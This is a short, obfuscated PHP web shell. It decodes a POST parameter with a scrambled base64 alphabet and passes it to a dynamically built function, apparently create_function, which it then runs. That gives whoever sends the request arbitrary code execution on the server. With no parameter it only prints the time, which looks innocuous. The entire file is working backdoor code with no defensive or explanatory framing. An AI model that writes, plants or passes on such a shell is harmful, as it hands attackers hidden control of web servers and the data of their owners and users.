<?php
define("T","ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=");
define("K","cbh+W6vKYXjOBumzIo8HCnTkeGsqDQAaF4xP/S0ZgN3Edp=U9lVwyir2tL15f7RMJ");
function decode($data){
    return base64_decode(strtr($data, K, T));
}
function asenc($data){
    return strtr(base64_encode($data),T, K);   
}

function p($n){
    return isset($_POST[$n])?decode($_POST[$n]):null;
}

$f = array(1,"p","",decode('e2XSekoSkrGiq0uysT7='),null);
if($f[1]($f[0])!=null){
    $f[4] = $f[3]($f[2],$f[1]($f[0]));
    $f[4]();
}else{
    echo(time());
}
